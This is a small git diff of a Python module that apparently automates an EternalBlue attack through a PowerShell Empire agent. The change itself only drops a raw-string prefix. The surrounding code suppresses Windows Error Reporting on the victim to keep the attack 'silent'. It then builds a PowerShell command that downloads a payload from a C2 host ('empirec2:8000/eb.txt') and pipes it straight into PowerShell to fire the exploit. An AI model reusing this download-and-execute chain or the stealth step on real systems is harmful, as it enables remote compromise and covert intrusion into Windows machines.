@@ -43,7 +43,7 @@ def run(API, agent_name, eternalblue_url='http://empirec2:8000/eb.txt'):
         print('Target is patched')
         return None
     # Suppress WER error UI to make it "silent"
-    opts = {'Agent': agent_name, 'command': r"""Set-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" -Name DontShowUI -Value 1"""}
+    opts = {'Agent': agent_name, 'command': """Set-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" -Name DontShowUI -Value 1"""}
     results = API.agent_run_shell_cmd_with_result(agent_name, opts)    
     # Fire EternalBlue using a new powershell process, else it will crash existing agent session
     run_eb = "shell (New-Object system.net.webclient).DownloadString('" + eternalblue_url + "') |powershell -noprofile -"
